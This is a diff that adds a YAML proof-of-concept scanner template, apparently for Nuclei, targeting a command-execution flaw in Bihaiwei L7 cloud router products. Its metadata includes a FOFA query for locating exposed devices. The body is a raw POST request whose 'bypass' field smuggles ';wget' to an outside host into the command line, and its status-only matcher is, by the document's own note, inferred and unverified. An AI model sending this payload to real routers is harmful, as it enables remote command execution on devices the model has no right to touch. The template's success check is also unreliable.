@@ -1,0 +1,30 @@
+id: poc-2114e4dfdc1c9d0f772a
+info:
+  name: 碧海威L7多款产品index存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2114e4dfdc1c9d0f772a49fa973eeb7b
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 2114e4dfdc1c9d0f772a49fa973eeb7b
+    fofa: product="碧海威科技-L7云路由"
+http:
+- raw:
+  - 'POST /portal/ibilling/index.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+
+
+    {"type":5,"version":2,"bypass":";wget sadvlgapra.dgrh3.cn"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
